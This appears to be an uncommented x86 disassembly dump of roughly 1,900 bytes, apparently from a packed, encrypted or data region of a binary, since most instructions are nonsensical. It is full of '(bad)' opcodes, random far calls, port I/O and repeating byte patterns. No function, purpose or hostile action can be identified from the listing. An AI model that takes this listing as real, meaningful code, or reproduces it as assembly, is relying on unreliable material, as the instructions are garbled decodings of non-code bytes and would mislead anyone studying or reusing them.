  4341db:	call   0xa8e8:0x5e343ac9
  4341e2:	popa   
  4341e3:	or     eax,0x3fd608cd
  4341e8:	popa   
  4341e9:	popa   
  4341ea:	popa   
  4341eb:	fisttp DWORD PTR [edx+0x47]
  4341ee:	xchg   DWORD PTR [edi+0x4a],edx
  4341f1:	inc    edi
  4341f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341f3:	pop    ds
  4341f4:	out    0xfb,eax
  4341f6:	or     eax,0x62d50875
  4341fb:	bound  esp,QWORD PTR [ecx+0x61]
  4341fe:	xchg   ebx,eax
  4341ff:	repnz sbb al,0xd2
  434202:	bound  esi,QWORD PTR [edx+0x18750d69]
  434208:	or     eax,0x616848db
  43420d:	popa   
  43420e:	(bad)  
  434210:	call   0xd79:0xeead7517
  434217:	jne    0x4341b3
  434219:	push   esi
  43421a:	jne    0x4341c9
  43421c:	pop    ss
  43421d:	jne    0x434243
  43421f:	or     eax,0xa2a22475
  434224:	shl    BYTE PTR [edx-0x4e],cl
  434227:	imul   ecx,DWORD PTR ds:0xdb0d1875,0x61616848
  434231:	(bad)  
  434233:	call   0x3c75:0xdad7517
  43423a:	test   DWORD PTR [ebx],ecx
  43423c:	call   0xa8e8:0x5e343ac9
  434243:	popa   
  434244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434245:	jne    0x4341f4
  434247:	mov    dl,0x8b
  434249:	or     eax,0xb852875
  43424e:	call   0x1364:0xcd0d3ac9
  434255:	outs   dx,BYTE PTR ds:[esi]
  434256:	push   0x61a8e85e
  43425b:	pop    ss
  43425c:	jne    0x4342c2
  43425e:	out    dx,al
  43425f:	jbe    0x43426e
  434261:	jne    0x43428b
  434263:	test   DWORD PTR [ebx],ecx
  434265:	call   0xa8e8:0x5e343ac9
  43426c:	popa   
  43426d:	or     eax,0xba93adcd
  434272:	pop    ds
  434273:	or     eax,0xa50db1cd
  434278:	xor    DWORD PTR [edi],edx
  43427a:	neg    DWORD PTR [edx]
  43427c:	lock pusha 
  43427e:	arpl   WORD PTR [edx+0x62],sp
  434281:	lock and DWORD PTR [ebp+0x62],edx
  434285:	bound  ecx,QWORD PTR ds:0xb853c75
  43428b:	call   0xa8e8:0x5e343ac9
  434292:	popa   
  434293:	mov    eax,ds:0x88e76475
  434298:	or     eax,0xb853c75
  43429d:	call   0xa8e8:0x5e343ac9
  4342a4:	popa   
  4342a5:	pop    ss
  4342a6:	jne    0x4342fc
  4342a8:	out    dx,al
  4342a9:	xchg   edx,eax
  4342aa:	or     eax,0xb852875
  4342af:	call   0xa8e8:0x5e343ac9
  4342b6:	popa   
  4342b7:	pop    ss
  4342b8:	jne    0x43430e
  4342ba:	or     eax,0x22575475
  4342bf:	xchg   BYTE PTR [ecx-0x5b],ah
  4342c2:	or     eax,0xa264d864
  4342c7:	and    DWORD PTR [ebp+0x69],esi
  4342ca:	lods   eax,DWORD PTR ds:[esi]
  4342cb:	loop   0x4342ce
  4342cd:	imul   esp,DWORD PTR [ecx],0xe2255d75
  4342d3:	add    DWORD PTR [ecx+0xd],ebp
  4342d6:	jne    0x43425e
  4342d8:	pop    ss
  4342d9:	jne    0x434330
  4342db:	or     eax,0x69750d1c
  4342e0:	test   DWORD PTR [ebx],ecx
  4342e2:	call   0xa8e8:0x5e343ac9
  4342e9:	popa   
  4342ea:	mov    eax,ds:0x6e939a75
  4342ef:	mov    bh,0x68
  4342f1:	popa   
  4342f2:	popa   
  4342f3:	or     eax,0xcd0d9a75
  4342f8:	call   0x31cd:0x1796da56
  4342ff:	and    DWORD PTR [ebp+0x64],esi
  434302:	sub    edx,esp
  434304:	add    DWORD PTR [ecx+0xd],ebp
  434307:	jne    0x43436d
  434309:	test   DWORD PTR [ebx],ecx
  43430b:	call   0xd669:0xcd0d3ac9
  434312:	outs   dx,DWORD PTR ds:[esi]
  434313:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434319:	pop    esi
  43431a:	call   0xa550a4c7
  43431f:	xor    DWORD PTR [ecx-0xa2dddf0],esp
  434325:	add    eax,0x956e9368
  43432a:	push   0x750d6161
  43432f:	xor    DWORD PTR ds:0x4569acd,ecx
  434335:	std    
  434336:	popa   
  434337:	popa   
  434338:	popa   
  434339:	pop    ss
  43433a:	int    0x18
  43433c:	or     eax,0xcd0d9a75
  434341:	xor    DWORD PTR ds:0x75179e99,ebp
  434347:	repz or eax,0xb856975
  43434d:	call   0xa8e8:0x5e343ac9
  434354:	popa   
  434355:	mov    eax,ds:0x6e93f375
  43435a:	sahf   
  43435b:	push   0x750d6161
  434360:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0xa8e85e34
  43436a:	popa   
  43436b:	pop    ss
  43436c:	jne    0x4343b6
  43436e:	and    DWORD PTR [ebp+0x3c],esi
  434371:	and    esp,edx
  434373:	add    DWORD PTR [ecx+0xd],ebp
  434376:	jne    0x434390
  434378:	or     eax,0x7517f7a2
  43437d:	push   eax
  43437e:	out    dx,al
  43437f:	xchg   ecx,eax
  434380:	or     eax,0xa20d1875
  434385:	not    DWORD PTR [edi]
  434387:	jne    0x4343d9
  434389:	or     eax,0xb856975
  43438e:	call   0xa8e8:0x5e343ac9
  434395:	popa   
  434396:	mov    eax,ds:0x6e935075
  43439b:	gs popa 
  43439d:	popa   
  43439e:	popa   
  43439f:	or     eax,0xb856975
  4343a4:	call   0xa8e8:0x5e343ac9
  4343ab:	popa   
  4343ac:	pop    ss
  4343ad:	jne    0x4343d7
  4343af:	out    dx,al
  4343b0:	cmp    cl,BYTE PTR ds:0x17a22875
  4343b6:	jne    0x4343e0
  4343b8:	or     eax,0xf3d85075
  4343bd:	call   0x9328:0x75a1f34f
  4343c4:	fdiv   st,st(5)
  4343c6:	popa   
  4343c7:	popa   
  4343c8:	popa   
  4343c9:	or     eax,0xcd0d2875
  4343ce:	sbb    BYTE PTR [ebx-0x6566d30e],dl
  4343d4:	aad    0x62
  4343d6:	xchg   ebx,eax
  4343d7:	popa   
  4343d8:	popa   
  4343d9:	pop    ss
  4343da:	jne    0x4343d5
  4343dc:	or     eax,0x610d1875
  4343e1:	or     eax,0x6e13f9cd
  4343e6:	call   0xb85:0x62531334
  4343ed:	call   0xd58:0x75173ac9
  4343f4:	jne    0x43441e
  4343f6:	or     eax,0xf29318cd
  4343fb:	sub    al,0x99
  4343fd:	call   0x4c75:0x1786691f
  434404:	or     eax,0xb855875
  434409:	call   0x139a:0xcd0d3ac9
  434410:	outs   dx,BYTE PTR ds:[esi]
  434411:	push   0x61a8e85e
  434416:	pop    ss
  434417:	jne    0x434479
  434419:	or     eax,0xcd0d4c75
  43441e:	cmp    al,0xd6
  434420:	outs   dx,DWORD PTR ds:[esi]
  434421:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434427:	pop    esi
  434428:	call   0x1feaa5d5
  43442d:	out    0xf7,eax
  43442f:	out    dx,al
  434430:	fucomi st,st(6)
  434432:	aaa    
  434433:	or     eax,0xcd0d4c75
  434438:	cmp    al,0xd6
  43443a:	outs   dx,DWORD PTR ds:[esi]
  43443b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434441:	pop    esi
  434442:	call   0x1feaa5ef
  434447:	mov    dl,0x8f
  434449:	or     eax,0x75176075
  43444e:	sbb    al,0xd
  434450:	jne    0x43446e
  434452:	or     eax,0xf3755661
  434457:	or     eax,0x68171ccd
  43445c:	lock shl BYTE PTR [edx+0x62],cl
  434460:	bound  ecx,QWORD PTR ds:0x75564875
  434466:	push   eax
  434467:	pop    ss
  434468:	jne    0x4344b2
  43446a:	or     eax,0xcd0d4875
  43446f:	fs (bad) 
  434471:	outs   dx,DWORD PTR ds:[esi]
  434472:	or     ebx,DWORD PTR [edx-0x5af2c537]
  434478:	xor    DWORD PTR [edi-0xa41b192],esp
  43447e:	add    eax,0xee5fe868
  434483:	mov    WORD PTR ds:0x75561875,cs
  434489:	push   eax
  43448a:	pop    ss
  43448b:	jne    0x4344a5
  43448d:	lock in eax,dx
  43448f:	arpl   WORD PTR [edx+0x62],sp
  434492:	or     eax,0xb855d75
  434497:	call   0xa8e8:0x5e343ac9
  43449e:	popa   
  43449f:	out    dx,al
  4344a0:	lea    ecx,ds:0xb856975
  4344a6:	call   0xa8e8:0x5e343ac9
  4344ad:	popa   
  4344ae:	push   edi
  4344af:	and    bl,BYTE PTR [edx+0x640da561]
  4344b5:	(bad)  
  4344b6:	fs pop ebp
  4344b8:	push   0x75216161
  4344bd:	mov    cl,0xad
  4344bf:	loop   0x4344c2
  4344c1:	imul   esp,DWORD PTR [ecx],0xe225fd75
  4344c7:	add    DWORD PTR [ecx+0xd],ebp
  4344ca:	jne    0x43447d
  4344cc:	test   DWORD PTR [ebx],ecx
  4344ce:	call   0xa8e8:0x5e343ac9
  4344d5:	popa   
  4344d6:	pop    ss
  4344d7:	jne    0x434501
  4344d9:	or     eax,0xb85b175
  4344de:	call   0xa8e8:0x5e343ac9
  4344e5:	popa   
  4344e6:	pop    ss
  4344e7:	jne    0x4344f1
  4344e9:	or     eax,0x7517fb75
  4344ee:	and    BYTE PTR [ebx],dl
  4344f0:	jne    0x4344e5
  4344f2:	pop    ss
  4344f3:	jne    0x434511
  4344f5:	or     eax,0x610d1c75
  4344fa:	or     eax,0x1faff3cd
  4344ff:	or     eax,0x68171ccd
  434504:	or     eax,0x610d1c75
  434509:	xor    edx,edx
  43450b:	sar    BYTE PTR [edi+0x1ccd0d3a],1
  434511:	pop    ss
  434512:	push   0x175d7513
  434517:	jne    0x43456d
  434519:	or     eax,0x610d5475
  43451e:	or     eax,0x1faf5dcd
  434523:	or     eax,0x681754cd
  434528:	or     eax,0x610d5475
  43452d:	xor    edx,DWORD PTR [edx+0xd3abfe1]
  434533:	int    0x54
  434535:	pop    ss
  434536:	push   0x17ad7513
  43453b:	jne    0x434536
  43453d:	or     eax,0x610df975
  434542:	or     eax,0x1fafadcd
  434547:	or     eax,0x6817f9cd
  43454c:	or     eax,0x610df975
  434551:	xor    ebp,DWORD PTR [ecx+eiz*8]
  434554:	mov    edi,0xf9cd0d3a
  434559:	pop    ss
  43455a:	push   0x17507513
  43455f:	jne    0x434575
  434561:	or     eax,0x610d1475
  434566:	or     eax,0x1faf50cd
  43456b:	or     eax,0x681714cd
  434570:	or     eax,0x610d1475
  434575:	xor    edx,edx
  434577:	addr16 inc eax
  434579:	cmp    cl,BYTE PTR ds:0x681714cd
  43457f:	and    DWORD PTR [ebp+0x55],esi
  434582:	ret    0x1fa
  434585:	imul   ebx,eax,0xe7619aea
  43458b:	cmp    al,bl
  43458d:	jmp    0xead8:0x78e76186
  434594:	mov    ah,BYTE PTR [ecx-0x19]
  434597:	jbe    0x4345a6
  434599:	jne    0x434535
  43459b:	xchg   ebx,eax
  43459c:	repnz popa 
  43459e:	or     eax,0x6fd655cd
  4345a3:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4345a9:	pop    esi
  4345aa:	call   0xf2d6a757
  4345af:	push   edi
  4345b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4345b1:	pop    ds
  4345b2:	out    0x3a,eax
  4345b4:	scas   eax,DWORD PTR es:[edi]
  4345b5:	sbb    al,0xf0
  4345b7:	ins    BYTE PTR es:[edi],dx
  4345b8:	xchg   ecx,eax
  4345b9:	popa   
  4345ba:	popa   
  4345bb:	or     eax,0xb85b175
  4345c0:	call   0xa8e8:0x5e343ac9
  4345c7:	popa   
  4345c8:	pop    ss
  4345c9:	jne    0x434607
  4345cb:	or     eax,0xb85b175
  4345d0:	call   0xa8e8:0x5e343ac9
  4345d7:	popa   
  4345d8:	pop    ss
  4345d9:	jne    0x434623
  4345db:	or     eax,0xcd0d9a75
  4345e0:	call   0x4ccd:0x1796da56
  4345e7:	or     eax,0xa20d4c75
  4345ec:	rcl    BYTE PTR [edi],cl
  4345ee:	jne    0x434638
  4345f0:	fsubr  st,st(2)
  4345f2:	dec    eax
  4345f3:	popa   
  4345f4:	mov    dl,0x3a
  4345f6:	scas   eax,DWORD PTR es:[edi]
  4345f7:	sbb    al,0xf0
  4345f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345fa:	xchg   ecx,eax
  4345fb:	popa   
  4345fc:	popa   
  4345fd:	and    DWORD PTR [ebp+0x58],esi
  434600:	lods   eax,DWORD PTR ds:[esi]
  434601:	loop   0x434613
  434603:	imul   edx,DWORD PTR [ebx],0x75175875
  434609:	and    al,0xd
  43460b:	jne    0x434665
  43460d:	test   DWORD PTR [ebx],ecx
  43460f:	call   0xa8e8:0x5e343ac9
  434616:	popa   
  434617:	or     eax,0x681724cd
  43461c:	or     eax,0xb85b175
  434621:	call   0xa8e8:0x5e343ac9
  434628:	popa   
  434629:	pop    ss
  43462a:	jne    0x434644
  43462c:	or     eax,0xdb0d2075
  434631:	or     al,0x68
  434633:	popa   
  434634:	popa   
  434635:	or     eax,0x170d20cd
  43463a:	or     al,0x68
  43463c:	popa   
  43463d:	popa   
  43463e:	or     eax,0x56610d91
  434643:	cdq    
  434644:	xchg   esi,eax
  434645:	pop    ss
  434646:	jne    0x4346a8
  434648:	or     eax,0xf2936075
  43464d:	mov    ds:0x60cd0d7e,al
  434652:	adc    ebp,DWORD PTR [eax+ebp*2]
  434655:	mov    dl,BYTE PTR [edi]
  434657:	jne    0x4346c2
  434659:	or     eax,0xb85b175
  43465e:	call   0xa8e8:0x5e343ac9
  434665:	popa   
  434666:	pop    ss
  434667:	jne    0x4346cd
  434669:	or     eax,0xdb0d2075
  43466e:	adc    BYTE PTR [eax+0x61],ch
  434671:	popa   
  434672:	or     eax,0x18751761
  434677:	or     eax,0xdb0d2075
  43467c:	adc    BYTE PTR [eax+0x61],ch
  43467f:	popa   
  434680:	or     eax,0x9aa718cd
  434685:	mov    dl,0x9f
  434687:	adc    esi,DWORD PTR [ebp+0x28]
  43468a:	ror    BYTE PTR ds:0xb855d75,cl
  434690:	call   0xa8e8:0x5e343ac9
  434697:	popa   
  434698:	ror    BYTE PTR ds:0xeb626075,cl
  43469e:	shl    BYTE PTR [edx-0x4e],cl
  4346a1:	sbb    BYTE PTR ds:0xdb0d2075,cl
  4346a7:	dec    eax
  4346a8:	push   0xd2626161
  4346ad:	jbe    0x4346bc
  4346af:	jne    0x434711
  4346b1:	or     eax,0xa20d60cd
  4346b6:	shr    BYTE PTR ds:0xdd2be99,cl
  4346bc:	jne    0x43471e
  4346be:	or     eax,0xda5618cd
  4346c3:	mov    esi,0x934bf3c9
  4346c8:	popa   
  4346c9:	popa   
  4346ca:	or     eax,0xdb0d2075
  4346cf:	jmp    0xda4a83c
  4346d4:	int    0x18
  4346d6:	pop    ss
  4346d7:	call   0xbeeb:0x624c750d
  4346de:	bound  esi,QWORD PTR [edx+0x18b2629a]
  4346e4:	repz fisttp QWORD PTR [ecx+eiz*2+0x18750d61]
  4346ec:	or     eax,0xda5618cd
  4346f1:	xchg   esi,eax
  4346f2:	pop    ss
  4346f3:	int    0x4c
  4346f5:	or     eax,0xf2934c75
  4346fa:	mov    ds:0x4ccd0d7e,al
  4346ff:	adc    ebp,DWORD PTR [eax+ebp*2]
  434702:	mov    dl,BYTE PTR [edi]
  434704:	jne    0x434737
  434706:	or     eax,0xf2934c75
  43470b:	mov    ds:0xb1cd0d3b,al
  434710:	(bad)  
  434711:	outs   dx,DWORD PTR ds:[esi]
  434712:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434718:	pop    esi
  434719:	call   0x1feaa8c6
  43471e:	xchg   ebx,eax
  43471f:	outs   dx,BYTE PTR ds:[esi]
  434720:	cmp    al,0x61
  434722:	popa   
  434723:	popa   
  434724:	or     eax,0xb85b175
  434729:	call   0xa8e8:0x5e343ac9
  434730:	popa   
  434731:	pop    ss
  434732:	jne    0x434735
  434734:	out    dx,al
  434735:	jl     0x434744
  434737:	jne    0x434736
  434739:	test   DWORD PTR [ebx],ecx
  43473b:	call   0x1301:0xcd0d3ac9
  434742:	outs   dx,BYTE PTR ds:[esi]
  434743:	push   0x61a8e85e
  434748:	pop    ss
  434749:	jne    0x43474c
  43474b:	or     eax,0x1cd83175
  434750:	cmp    BYTE PTR [edi],dl
  434752:	jne    0x434785
  434754:	or     eax,0xf2934c75
  434759:	mov    ds:0xfdcd0d3b,al
  43475e:	(bad)  
  43475f:	outs   dx,DWORD PTR ds:[esi]
  434760:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434766:	pop    esi
  434767:	call   0x1f70a914
  43476c:	mov    eax,ds:0xb4930175
  434771:	or     eax,0xd616161
  434776:	jne    0x4347c4
  434778:	or     eax,0xddaaaa2
  43477d:	int    0x31
  43477f:	jg     0x43471a
  434781:	call   0xd4c:0x750d7de7
  434788:	mov    ds:0x584adaaa,al
  43478d:	or     eax,0x997f31cd
  434792:	call   0xaa99:0x564ccd0d
  434799:	pop    ss
  43479a:	loop   0x434722
  43479c:	arpl   WORD PTR [edx+0x62],sp
  43479f:	out    dx,al
  4347a0:	xchg   BYTE PTR ds:0xa20d3175,cl
  4347a6:	call   0x6262:0x6386e217
  4347ad:	bound  ecx,QWORD PTR [ebx]
  4347af:	xchg   BYTE PTR [ebx+0x62],ah
  4347b2:	bound  ecx,QWORD PTR ds:0xcd0d3175
  4347b8:	sbb    BYTE PTR [esi-0x26],dl
  4347bb:	xchg   cl,cl
  4347bd:	repz arpl WORD PTR [ecx+eiz*2-0x4e8af29f],cx
  4347c5:	test   DWORD PTR [ebx],ecx
  4347c7:	call   0xa8e8:0x5e343ac9
  4347ce:	popa   
  4347cf:	or     eax,0x99a131cd
  4347d4:	xchg   edx,eax
  4347d5:	mov    dl,0x34
  4347d7:	lock shl BYTE PTR [edx+0x62],0x62
  4347dc:	or     eax,0xeb623175
  4347e1:	xchg   edx,eax
  4347e2:	or     eax,0xcd0d3175
  4347e7:	call   0x750d:0xc97eda56
  4347ee:	xor    DWORD PTR ds:0xda5618cd,ecx
  4347f4:	xchg   cl,cl
  4347f6:	repz out 0x8d,al
  4347f9:	popa   
  4347fa:	popa   
  4347fb:	lock test BYTE PTR [edx+0x62],ah
  4347ff:	bound  ecx,QWORD PTR ds:0xdb0d2075
  434805:	adc    BYTE PTR [eax+0x61],ch
  434808:	popa   
  434809:	or     eax,0x9aa718cd
  43480e:	mov    dl,0x85
  434810:	adc    esi,DWORD PTR [ebp+0x28]
  434813:	ror    BYTE PTR ds:0xb85ad75,cl
  434819:	call   0xa8e8:0x5e343ac9
  434820:	popa   
  434821:	ror    BYTE PTR ds:0xeb626075,cl
  434827:	mov    esi,0xd18b262
  43482c:	jne    0x43484e
  43482e:	or     eax,0x616848db
  434833:	popa   
  434834:	(bad)
  434839:	mov    dl,0x90
  43483b:	lock cmp al,0x3b
  43483e:	popa   
  43483f:	popa   
  434840:	lock push ecx
  434842:	cmp    esp,DWORD PTR [ecx+0x61]
  434845:	or     eax,0xdb0d2075
  43484a:	pusha  
  43484b:	push   0x610d6161
  434850:	test   DWORD PTR [ebx],ecx
  434852:	call   0xa8e8:0x5e343ac9
  434859:	popa   
  43485a:	xchg   ebx,eax
  43485b:	outs   dx,BYTE PTR ds:[esi]
  43485c:	gs pop edi
  43485e:	popa   
  43485f:	popa   
  434860:	adc    esp,edx
  434862:	imul   esp,DWORD PTR [ebx+0x62],0x55e21762
  434869:	arpl   WORD PTR [edx+0x62],sp
  43486c:	or     eax,0xb85b175
  434871:	call   0xa8e8:0x5e343ac9
  434878:	popa   
  434879:	or     eax,0x62635513
  43487e:	bound  edx,QWORD PTR [edi]
  434880:	push   0x629ae221
  434885:	bound  esp,QWORD PTR [edx-0x1]
  434888:	loop   0x43488b
  43488a:	imul   esp,DWORD PTR [ecx],0x626286e2
  434890:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434894:	imul   esp,DWORD PTR [ecx],0x626292e2
  43489a:	bound  edi,QWORD PTR [edx+eiz*8]
  43489d:	add    DWORD PTR [ecx+0x21],ebp
  4348a0:	loop   0x434920
  4348a2:	bound  esp,QWORD PTR [edx+0x62]
  4348a5:	stc    
  4348a6:	loop   0x4348a9
  4348a8:	imul   esp,DWORD PTR [ecx],0x62628ae2
  4348ae:	(bad)  
  4348af:	stc    
  4348b0:	loop   0x4348b3
  4348b2:	imul   esp,DWORD PTR [ecx],0x626276e2
  4348b8:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4348be:	pop    ebx
  4348bf:	dec    eax
  4348c0:	arpl   WORD PTR [edx+0x62],sp
  4348c3:	popa   
  4348c4:	out    dx,al
  4348c5:	lea    ecx,ds:0x626348e2
  4348cb:	bound  esp,QWORD PTR [edx+0x6348e217]
  4348d1:	bound  esp,QWORD PTR [edx-0x28]
  4348d4:	and    ecx,DWORD PTR [eax+0x63]
  4348d7:	bound  esp,QWORD PTR [edx+0x3b]
  4348da:	jae    0x4348de
  4348dc:	or     eax,0x626348e2
  4348e1:	bound  ecx,QWORD PTR ds:0x629ae26e
  4348e7:	bound  esp,QWORD PTR [edx-0x7b]
  4348ea:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4348f0:	call   0x1350aa9d
  4348f5:	dec    eax
  4348f6:	arpl   WORD PTR [edx+0x62],sp
  4348f9:	xchg   esp,eax
  4348fa:	pop    ss
  4348fb:	outs   dx,BYTE PTR ds:[esi]
  4348fc:	int    0x64
  4348fe:	arpl   WORD PTR [edx+0x62],sp
  434901:	out    dx,al
  434902:	adc    eax,0x62fbe221
  434907:	bound  esp,QWORD PTR [edx+0x18]
  43490a:	loop   0x43490d
  43490c:	imul   esp,DWORD PTR [ecx],0x62628ee2
  434912:	bound  edi,QWORD PTR [edx+eiz*8]
  434915:	add    DWORD PTR [ecx+0x21],ebp
  434918:	loop   0x434952
  43491a:	bound  esp,QWORD PTR [edx+0x62]
  43491d:	and    ah,dl
  43491f:	add    DWORD PTR [ecx+0x21],ebp
  434922:	loop   0x4348ca
  434924:	bound  esp,QWORD PTR [edx+0x62]
  434927:	arpl   dx,sp
  434929:	add    DWORD PTR [ecx+0x21],ebp
  43492c:	loop   0x4349a0
  43492e:	bound  esp,QWORD PTR [edx+0x62]
  434931:	cmp    eax,0x216901e2
  434936:	loop   0x4348d6
  434938:	bound  esp,QWORD PTR [edx+0x62]
  43493b:	jmp    edx
  43493d:	add    DWORD PTR [ecx+0x21],ebp
  434940:	loop   0x4348ec
  434942:	bound  esp,QWORD PTR [edx+0x62]
  434945:	cmp    al,0xe2
  434947:	add    DWORD PTR [ecx+0x21],ebp
  43494a:	loop   0x4348e2
  43494c:	bound  esp,QWORD PTR [edx+0x62]
  43494f:	(bad)  
  434951:	add    DWORD PTR [ecx+0x21],ebp
  434954:	loop   0x4348f8
  434956:	bound  esp,QWORD PTR [edx+0x62]
  434959:	jmp    edx
  43495b:	add    DWORD PTR [ecx+0x21],ebp
  43495e:	loop   0x43498c
  434960:	bound  esp,QWORD PTR [edx+0x62]
  434963:	dec    esp
  434964:	loop   0x434967
  434966:	imul   esp,DWORD PTR [ecx],0x6262dae2
  43496c:	bound  esp,QWORD PTR [edx]
  43496e:	loop   0x434971
  434970:	imul   esp,DWORD PTR [ecx],0x6262c6e2
  434976:	bound  ecx,QWORD PTR [ebp-0x1e]
  434979:	add    DWORD PTR [ecx+0x21],ebp
  43497c:	loop   0x434950
  43497e:	bound  esp,QWORD PTR [edx+0x62]
  434981:	arpl   dx,sp
  434983:	add    DWORD PTR [ecx+0x21],ebp
  434986:	loop   0x434946
  434988:	bound  esp,QWORD PTR [edx+0x62]
  43498b:	pop    ds
  43498c:	loop   0x43498f
  43498e:	imul   esp,DWORD PTR [ecx],0x6262cae2
  434994:	bound  esp,QWORD PTR [edx]
  434996:	loop   0x434999
  434998:	imul   esp,DWORD PTR [ecx],0x6262b6e2
  43499e:	bound  esp,QWORD PTR [ebp-0x1e]
  4349a1:	add    DWORD PTR [ecx+0x21],ebp
  4349a4:	loop   0x4349e6
  4349a6:	bound  esp,QWORD PTR [edx+0x62]
  4349a9:	cmp    al,0xe2
  4349ab:	add    DWORD PTR [ecx+0x21],ebp
  4349ae:	loop   0x43497e
  4349b0:	bound  esp,QWORD PTR [edx+0x62]
  4349b3:	cmp    al,0xe2
  4349b5:	add    DWORD PTR [ecx+0x21],ebp
  4349b8:	loop   0x434a34
  4349ba:	bound  esp,QWORD PTR [edx+0x62]
  4349bd:	and    ah,dl
  4349bf:	add    DWORD PTR [ecx+0x21],ebp
  4349c2:	loop   0x4349aa
  4349c4:	bound  esp,QWORD PTR [edx+0x62]
  4349c7:	dec    ecx
  4349c8:	loop   0x4349cb
  4349ca:	imul   esp,DWORD PTR [ecx],0x6262ebe2
  4349d0:	bound  edx,QWORD PTR [ebx-0x1e]
  4349d3:	add    DWORD PTR [ecx+0x21],ebp
  4349d6:	loop   0x4349bf
  4349d8:	bound  esp,QWORD PTR [edx+0x62]
  4349db:	push   ebx
  4349dc:	loop   0x4349df
  4349de:	imul   esp,DWORD PTR [ecx],0x6262e3e2
  4349e4:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4349ea:	pop    ebx
  4349eb:	cmp    al,0x63
  4349ed:	bound  esp,QWORD PTR [edx+0x61]
  4349f0:	out    dx,al
  4349f1:	lea    ecx,ds:0x62633ce2
  4349f7:	bound  esp,QWORD PTR [edx+0x633ce217]
  4349fd:	bound  esp,QWORD PTR [edx-0x28]
  434a00:	and    edi,DWORD PTR [ebx+eiz*2]
  434a03:	bound  esp,QWORD PTR [edx-0x75]
  434a06:	jae    0x434a87
  434a08:	or     eax,0x62633ce2
  434a0d:	bound  ecx,QWORD PTR ds:0x62fbe26e
  434a13:	bound  esp,QWORD PTR [edx-0x7b]
  434a16:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434a1c:	call   0x1350abc9
  434a21:	cmp    al,0x63
  434a23:	bound  esp,QWORD PTR [edx+0x4]
  434a26:	sub    al,0x8d
  434a28:	fucomi st,st(6)
  434a2a:	and    DWORD PTR [ebx],edx
  434a2c:	loop   0x434a92
  434a2e:	arpl   WORD PTR [edx+0x62],sp
  434a31:	ror    BYTE PTR ds:0xdb0d2075,cl
  434a37:	dec    eax
  434a38:	push   0xd2626161
  434a3d:	not    DWORD PTR [edi]
  434a3f:	loop   0x434aa2
  434a41:	bound  esp,QWORD PTR [edx+0x62]
  434a44:	adc    esi,DWORD PTR [ebp-0xb]
  434a47:	pop    ss
  434a48:	loop   0x434a41
  434a4a:	bound  esp,QWORD PTR [edx+0x62]
  434a4d:	adc    esi,DWORD PTR [ebp-0x25]
  434a50:	shl    BYTE PTR [edx+0xb],cl
  434a53:	popa   
  434a54:	bound  esp,QWORD PTR [edx+0x62]
  434a57:	or     eax,0xdb0d2075
  434a5c:	dec    eax
  434a5d:	push   0xd2626161
  434a62:	call   0x6262:0x62f7130d
  434a69:	pop    ss
  434a6a:	push   0x6369e213
  434a6f:	bound  esp,QWORD PTR [edx-0x2e]
  434a72:	or     eax,0xdb0d2075
  434a77:	adc    BYTE PTR [eax+0x61],ch
  434a7a:	popa   
  434a7b:	bound  esi,QWORD PTR [edx+0xd]
  434a7e:	jne    0x434a75
  434a80:	bound  ebx,QWORD PTR [eax+0x13]
  434a83:	loop   0x434a9d
  434a85:	arpl   WORD PTR [edx+0x62],sp
  434a88:	pop    ss
  434a89:	loop   0x434a7e
  434a8b:	arpl   WORD PTR [edx+0x62],sp
  434a8e:	or     eax,0xb85b175
  434a93:	call   0xa8e8:0x5e343ac9
  434a9a:	popa   
  434a9b:	or     eax,0x6263f313
  434aa0:	bound  edx,QWORD PTR [edi]
  434aa2:	push   0x85b1750d
  434aa7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434aad:	call   0xe2e4ac5a
  434ab2:	imul   esp,DWORD PTR [ebx+0x62],0x116e9362
  434ab9:	popa   
  434aba:	popa   
  434abb:	popa   
  434abc:	adc    esp,edx
  434abe:	push   eax
  434abf:	arpl   WORD PTR [edx+0x62],sp
  434ac2:	pop    ss
  434ac3:	loop   0x434aed
  434ac5:	arpl   WORD PTR [edx+0x62],sp
  434ac8:	or     eax,0x626328e2
  434acd:	bound  ecx,QWORD PTR ds:0x62636913
  434ad3:	bound  edx,QWORD PTR [edi]
  434ad5:	call   0x10db:0xd20750d
  434adc:	push   0x130d6161
  434ae1:	imul   esp,DWORD PTR [ebx+0x62],0x8ad10d62
  434ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ae9:	call   0x6355:0xe20d78e7
  434af0:	bound  esp,QWORD PTR [edx+0xd]
  434af3:	adc    ebp,DWORD PTR [ecx+0x63]
  434af6:	bound  esp,QWORD PTR [edx+0xd]
  434af9:	xchg   ecx,eax
  434afa:	pop    ss
  434afb:	call   0x6262:0x6350e20d
  434b02:	mov    eax,ds:0x626369e2
  434b07:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434b0d:	pusha  
  434b0e:	or     eax,0xdb0d2075
  434b13:	adc    BYTE PTR [eax+0x61],ch
  434b16:	popa   
  434b17:	or     eax,0x62636913
  434b1c:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434b22:	mov    dl,0x39
  434b24:	or     eax,0xdb0d2075
  434b29:	or     al,0x68
  434b2b:	popa   
  434b2c:	popa   
  434b2d:	or     eax,0x60cd0d61
  434b32:	push   esi
  434b33:	cdq    
  434b34:	cmp    BYTE PTR ds:0x62636913,cl
  434b3a:	bound  edx,QWORD PTR [edi]
  434b3c:	cdq    
  434b3d:	jbe    0x434b4c
  434b3f:	jne    0x434b3e
  434b41:	test   DWORD PTR [ebx],ecx
  434b43:	call   0xa8e8:0x5e343ac9
  434b4a:	popa   
  434b4b:	or     eax,0x6263f313
  434b50:	bound  edx,QWORD PTR [edi]
  434b52:	push   0x6e931caf
